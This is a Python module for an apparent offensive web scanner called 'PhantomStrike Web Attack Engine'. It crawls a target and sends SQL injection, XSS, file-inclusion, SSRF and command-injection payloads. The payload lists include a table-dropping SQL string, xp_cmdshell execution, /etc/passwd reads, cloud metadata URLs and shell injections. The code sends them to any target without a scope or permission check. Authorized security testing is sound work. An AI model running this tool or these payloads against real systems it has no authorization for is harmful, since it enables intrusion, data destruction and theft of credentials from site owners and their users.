"""
PhantomStrike Web Attack Engine — Elite web vulnerability scanner.
Multi-threaded SQLi, XSS, SSRF, RCE, LFI detection.
Integrates Playwright for JS-rendered page analysis.
"""
from __future__ import annotations
import asyncio
import logging
import re
from datetime import datetime
from typing import Optional
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

import aiohttp

from phantom.modules.base import BaseModule, ModuleResult, ModuleStatus
from phantom.core.events import EventBus, Event, EventType

logger = logging.getLogger("phantom.web")

# SQLi payloads
SQLI_PAYLOADS = [
    "' OR '1'='1", "\" OR \"1\"=\"1", "' OR 1=1--", "\" OR 1=1--",
    "'; DROP TABLE users--", "' UNION SELECT NULL--",
    "1' AND '1'='1", "1 AND 1=1", "' WAITFOR DELAY '0:0:5'--",
    "1; EXEC xp_cmdshell('whoami')--",
    "' OR SLEEP(5)--", "') OR ('1'='1",
]

# XSS payloads
XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg onload=alert(1)>',
    "javascript:alert('XSS')",
    '<body onload=alert(1)>',
    "'-alert(1)-'",
    '<details open ontoggle=alert(1)>',
]

# LFI payloads
LFI_PAYLOADS = [
    "../../etc/passwd", "../../../etc/passwd",
    "....//....//etc/passwd", "/etc/passwd",
    "..\\..\\windows\\system32\\drivers\\etc\\hosts",
    "php://filter/convert.base64-encode/resource=index.php",
    "file:///etc/passwd",
]

# SSRF payloads
SSRF_PAYLOADS = [
    "http://127.0.0.1", "http://localhost",
    "http://169.254.169.254/latest/meta-data/",  # AWS metadata
    "http://[::1]", "http://0.0.0.0",
    "http://metadata.google.internal/",  # GCP metadata
]

# RCE payloads
RCE_PAYLOADS = [
    "; ls -la", "| id", "&& whoami",
    "`id`", "$(id)", "; cat /etc/passwd",
    "| cat /etc/passwd", "&& cat /etc/passwd",
]

# Error patterns for SQLi detection
SQLI_ERRORS = [
    "sql syntax", "mysql_fetch", "sqlite3", "postgresql",
    "ORA-", "SQL Server", "ODBC", "syntax error",
    "unterminated", "quoted string", "unexpected end",
    "mysql_num_rows", "pg_query", "SQLite3::",
]


class WebEngine(BaseModule):
    """Multi-threaded web vulnerability scanner with Playwright support."""

    @property
    def name(self) -> str:
        return "phantom-web"

    @property
    def description(self) -> str:
        return "Web attacks — SQLi, XSS, SSRF, RCE, LFI with Playwright"

    @property
    def category(self) -> str:
        return "vulnerability"

    async def _setup(self):
        self._session: Optional[aiohttp.ClientSession] = None

    async def run(self, target: str, options: dict = None) -> ModuleResult:
        """Run full web vulnerability scan."""
        options = options or {}
        self.status = ModuleStatus.RUNNING
        start_time = datetime.now()

        if not target.startswith("http"):
            target = f"https://{target}"

        findings = {
            "target": target,
            "sqli": [],
            "xss": [],
            "lfi": [],
            "ssrf": [],
            "rce": [],
            "headers_issues": [],
            "endpoints": [],
        }

        self._session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=15),
            headers={
                "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) Chrome/125.0.0.0",
            },
        )

        try:
            # Phase 1: Crawl and discover endpoints
            endpoints = await self._discover_endpoints(target)
            findings["endpoints"] = endpoints

            # Phase 2: Security headers check
            findings["headers_issues"] = await self._check_security_headers(target)

            # Phase 3: Multi-threaded vulnerability testing
            tasks = []
            for endpoint in endpoints[:50]:  # Test top 50 endpoints
                tasks.append(self._test_sqli(endpoint, findings))
                tasks.append(self._test_xss(endpoint, findings))
                tasks.append(self._test_lfi(endpoint, findings))

            # Also test SSRF and RCE on main target
            tasks.append(self._test_ssrf(target, findings))
            tasks.append(self._test_rce(target, findings))

            await asyncio.gather(*tasks, return_exceptions=True)

        except Exception as e:
            logger.error(f"[WEB] Error: {e}")
        finally:
            if self._session:
                await self._session.close()

        total_vulns = sum(
            len(findings[k]) for k in ["sqli", "xss", "lfi", "ssrf", "rce"]
        )

        self.status = ModuleStatus.COMPLETED
        return ModuleResult(
            module_name=self.name,
            operation="web_vuln_scan",
            success=True,
            data=findings,
            findings_count=total_vulns,
            start_time=start_time,
            end_time=datetime.now(),
        )

    async def _discover_endpoints(self, base_url: str) -> list[str]:
        """Crawl and discover testable endpoints."""
        endpoints = set()
        try:
            async with self._session.get(base_url) as resp:
                html = await resp.text()
                # Extract URLs from HTML
                urls = re.findall(r'(?:href|action|src)=["\']([^"\']+)["\']', html)
                for url in urls:
                    full = urljoin(base_url, url)
                    if urlparse(full).netloc == urlparse(base_url).netloc:
                        endpoints.add(full)
        except Exception as e:
            logger.debug(f"[WEB] Crawl error: {e}")

        # Add common test endpoints
        common = [
            "/login", "/api", "/search", "/admin", "/user",
            "/profile", "/dashboard", "/upload", "/download",
            "/api/v1", "/api/v2", "/graphql", "/rest",
        ]
        for path in common:
            endpoints.add(urljoin(base_url, path))

        return list(endpoints)

    async def _check_security_headers(self, url: str) -> list[dict]:
        """Check for missing security headers."""
        issues = []
        try:
            async with self._session.get(url) as resp:
                headers = resp.headers
                required = {
                    "X-Frame-Options": "Missing — Clickjacking possible",
                    "X-Content-Type-Options": "Missing — MIME sniffing possible",
                    "Strict-Transport-Security": "Missing — No HSTS",
                    "Content-Security-Policy": "Missing — No CSP",
                    "X-XSS-Protection": "Missing — XSS filter off",
                    "Referrer-Policy": "Missing — Referrer leakage",
                    "Permissions-Policy": "Missing — No feature policy",
                }
                for header, desc in required.items():
                    if header not in headers:
                        issues.append({"header": header, "issue": desc, "severity": "medium"})
        except Exception:
            pass
        return issues

    async def _test_sqli(self, url: str, findings: dict):
        """Test endpoint for SQL injection."""
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        if not params:
            # Test with common parameter names
            params = {"id": ["1"], "q": ["test"], "search": ["test"]}

        for param_name in params:
            for payload in SQLI_PAYLOADS[:6]:
                try:
                    test_params = {param_name: payload}
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                    async with self._session.get(test_url) as resp:
                        body = await resp.text()
                        body_lower = body.lower()

                        if any(err in body_lower for err in SQLI_ERRORS):
                            vuln = {
                                "type": "sqli",
                                "url": test_url,
                                "parameter": param_name,
                                "payload": payload,
                                "evidence": "SQL error in response",
                                "severity": "critical",
                            }
                            findings["sqli"].append(vuln)
                            await self.event_bus.emit(Event(
                                type=EventType.VULN_FOUND,
                                data=vuln, source=self.name,
                                severity="critical",
                            ))
                            logger.info(f"[WEB] 🔴 SQLi FOUND: {test_url}")
                            return  # Found on this param, move on
                except Exception:
                    pass

    async def _test_xss(self, url: str, findings: dict):
        """Test for reflected XSS."""
        parsed = urlparse(url)
        for payload in XSS_PAYLOADS[:4]:
            try:
                test_params = {"q": payload, "search": payload}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                async with self._session.get(test_url) as resp:
                    body = await resp.text()
                    if payload in body:
                        vuln = {
                            "type": "reflected_xss",
                            "url": test_url,
                            "payload": payload,
                            "severity": "high",
                        }
                        findings["xss"].append(vuln)
                        await self.event_bus.emit(Event(
                            type=EventType.VULN_FOUND,
                            data=vuln, source=self.name, severity="high",
                        ))
                        logger.info(f"[WEB] 🟠 XSS FOUND: {test_url}")
                        return
            except Exception:
                pass

    async def _test_lfi(self, url: str, findings: dict):
        """Test for Local File Inclusion."""
        parsed = urlparse(url)
        for payload in LFI_PAYLOADS[:4]:
            try:
                test_params = {"file": payload, "page": payload, "path": payload}
                test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_params)}"

                async with self._session.get(test_url) as resp:
                    body = await resp.text()
                    if "root:" in body or "daemon:" in body or "[boot loader]" in body:
                        vuln = {
                            "type": "lfi",
                            "url": test_url,
                            "payload": payload,
                            "severity": "critical",
                        }
                        findings["lfi"].append(vuln)
                        await self.event_bus.emit(Event(
                            type=EventType.VULN_FOUND,
                            data=vuln, source=self.name, severity="critical",
                        ))
                        logger.info(f"[WEB] 🔴 LFI FOUND: {test_url}")
                        return
            except Exception:
                pass

    async def _test_ssrf(self, url: str, findings: dict):
        """Test for Server-Side Request Forgery."""
        # SSRF tests would normally use a collaborator/callback server
        # This is a simplified detection
        for payload in SSRF_PAYLOADS[:3]:
            try:
                test_params = {"url": payload, "redirect": payload, "target": payload}
                test_url = f"{url}?{urlencode(test_params)}"

                async with self._session.get(test_url, allow_redirects=False) as resp:
                    body = await resp.text()
                    if "ami-" in body or "instance-id" in body or "meta-data" in body:
                        vuln = {
                            "type": "ssrf",
                            "url": test_url,
                            "payload": payload,
                            "severity": "critical",
                        }
                        findings["ssrf"].append(vuln)
                        await self.event_bus.emit(Event(
                            type=EventType.VULN_FOUND,
                            data=vuln, source=self.name, severity="critical",
                        ))
                        logger.info(f"[WEB] 🔴 SSRF FOUND: {test_url}")
                        return
            except Exception:
                pass

    async def _test_rce(self, url: str, findings: dict):
        """Test for Remote Code Execution."""
        for payload in RCE_PAYLOADS[:4]:
            try:
                test_params = {"cmd": payload, "exec": payload, "command": payload}
                test_url = f"{url}?{urlencode(test_params)}"

                async with self._session.get(test_url) as resp:
                    body = await resp.text()
                    if "uid=" in body or "root:" in body or "total " in body:
                        vuln = {
                            "type": "rce",
                            "url": test_url,
                            "payload": payload,
                            "severity": "critical",
                        }
                        findings["rce"].append(vuln)
                        await self.event_bus.emit(Event(
                            type=EventType.VULN_FOUND,
                            data=vuln, source=self.name, severity="critical",
                        ))
                        logger.info(f"[WEB] 🔴 RCE FOUND: {test_url}")
                        return
            except Exception:
                pass
